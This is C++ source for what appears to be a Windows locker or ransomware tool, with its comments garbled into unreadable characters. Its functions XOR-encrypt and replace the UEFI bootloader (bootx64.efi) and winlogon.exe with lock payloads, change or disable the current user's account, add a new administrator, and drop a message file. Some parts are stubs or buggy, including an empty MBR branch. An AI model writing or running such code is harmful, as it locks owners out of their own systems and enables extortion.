#include "Lock.h"
#include <vector>
/*Ӳ���� ������*/
int DiskLock(LockCore locker)
{
    HANDLE DiskHandle = NULL;
    GetPhysicalDriveHandle(DiskHandle,GetSystemDiskPhysicalNumber());
    LPCSTR device = "\\\\.\\PhysicalDrive" + GetSystemDiskPhysicalNumber();
    string boot = GetPartitiontype(DiskHandle);
    if (boot == "GPT")
    {
        if (!SetDriveLetterToEFI(device,'X'))
        {
            string script = "select disk " + to_string(GetSystemDiskPhysicalNumber()) + " && select partition 1 && assign letter=X && exit";
            system(("echo " + script + " | diskpart").c_str());
            //���о͵���diskpart�ű�
        }
        // ��bootx64.efi�ļ�
        HANDLE hEfiSrc = CreateFileA("X:\\ESP\\BOOT\\bootx64.efi", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hEfiSrc == INVALID_HANDLE_VALUE)
        {
            cout << "�޷����ļ�" << endl;
            return GetLastError();
        }

        // ��ȡ�ļ���С
        DWORD fileSize = GetFileSize(hEfiSrc, NULL);
        vector<char> buffer(fileSize);

        DWORD bytesRead;
        if (!ReadFile(hEfiSrc, &buffer[0], fileSize, &bytesRead, NULL))
        {
            CloseHandle(hEfiSrc);
            return GetLastError();
        }
        CloseHandle(hEfiSrc);

        // �Զ�ȡ�����ݽ���������
        for (int i = 0; i < buffer.size(); i++)
        {
            buffer[i] ^= locker.Xorkey;
        }

        HANDLE hBackup = CreateFileA("X:\\ESP\\BOOT\\bootbackup.yeluo", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hBackup == INVALID_HANDLE_VALUE)
        {
            cout << "�޷������ļ�" << endl;
            return GetLastError();
        }

        DWORD bytesWritten;
        if (!WriteFile(hBackup, &buffer[0], buffer.size(), &bytesWritten, NULL))
        {
            CloseHandle(hBackup);
            return GetLastError();
        }
        CloseHandle(hBackup);

        HANDLE hEfiDst = CreateFileA("X:\\ESP\\BOOT\\bootx64.efi", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hEfiDst == INVALID_HANDLE_VALUE)
        {
            return GetLastError();
        }

        if (!WriteFile(hEfiDst, locker.UefiLockCore, sizeof(locker.UefiLockCore), &bytesWritten, NULL))
        {
            CloseHandle(hEfiDst);
            return GetLastError();
        }
        CloseHandle(hEfiDst);

        return 0;
    }
    else//  mbr
    {

    }
}
// �û������������ڴ���һ�����û������õ�ǰ�û�
// ���������setting - �û�������
// ����ֵ��bool���ͣ���ʾ������ִ�н��
BOOL UserLock( UserLockSetting setting)
{
    // ��ȡ��ǰ�û����û���
    LPWSTR local = W_GetCurrentUsername();

    // ���ĵ�ǰ�û�������
    if (!CurrentUser(local, setting.newPassword))
    {
        // �����������ʧ�ܣ��򷵻�ִ��ʧ��
        return false;
    }

    // �����Ҫ����ԭ�û���
    if (setting.changeOriginalUsername)
    {
        // ���ĵ�ǰ�û���
        if (!RenameUserAccount(local, setting.newUsername))
        {
            // ��������û���ʧ�ܣ��򷵻�ִ��ʧ��
            return false;
        }
    }
    else // �������Ҫ����ԭ�û���
    {
        // ����һ�����û�����������ӵ�����Ա����
        // ͬʱ���õ�ǰ�û���ʹ���޷���¼
        if (!NetUserAddAdmin(setting.newUsername, setting.newUsername) || !DisableUserAccount(local))
        {
            // ��������û�������û�ʧ�ܣ��򷵻�ִ��ʧ��
            return false;
        }
    }
    return true;
}
/*�����ļ���*/
int FileLock(string password)
{
	return 0;
}
/*�ٳ�winlogin��¼��*/
int LoginLock(LoginLockSetting setting)
{
    // ��Ҫ��ȡ���ļ�
    HANDLE hIn = CreateFileA("C:\\Windows\\System32\\winlogon.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE)
    {
        std::cerr << "�޷����ļ�" << std::endl;
        return -1;
    }

    // ��ȡ�ļ���С
    DWORD dwFileSize = GetFileSize(hIn, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        std::cerr << "�޷���ȡ�ļ���С" << std::endl;
        CloseHandle(hIn);
        return -1;
    }

    // ��ȡ�ļ����ݵ�������
    std::vector<char> buffer(dwFileSize);
    DWORD dwBytesRead = 0;
    if (!ReadFile(hIn, buffer.data(), dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        std::cerr << "��ȡ�ļ�ʧ��" << std::endl;
        CloseHandle(hIn);
        return -1;
    }
    CloseHandle(hIn);

    // �Զ�ȡ�����ݽ���������
    const char xorKey = setting.XorKey;
    for (char& c : buffer)
    {
        c ^= xorKey;
    }

    // д����ܺ�����ݵ��ļ�
    HANDLE hOut = CreateFileA("C:\\loginbackup.yeluo", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        std::cerr << "�޷������ļ�" << std::endl;
        return -1;
    }
    DWORD dwBytesWritten = 0;
    if (!WriteFile(hOut, buffer.data(), dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize)
    {
        std::cerr << "д���ļ�ʧ��" << std::endl;
        CloseHandle(hOut);
        return -1;
    }
    CloseHandle(hOut);

    // д���µ����ݵ��ļ�
    hOut = CreateFileA("C:\\Windows\\System32\\winlogon.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        std::cerr << "�޷����ļ�" << std::endl;
        return -1;
    }
    if (!WriteFile(hOut, setting.LockCore, sizeof(setting.LockCore), &dwBytesWritten, NULL) || dwBytesWritten != sizeof(setting.LockCore))
    {
        std::cerr << "д���ļ�ʧ��" << std::endl;
        CloseHandle(hOut);
        return -1;
    }
    CloseHandle(hOut);
    // ��lock�����ʾ��Ϣ
    std::ofstream output_file("C:\\msg.txt", std::ios::binary);
    // �����úõ���Ϣд���ļ�
    output_file.write(setting.ShowMsg.c_str(), setting.ShowMsg.length());
    // �ر��ļ�
    output_file.close();
}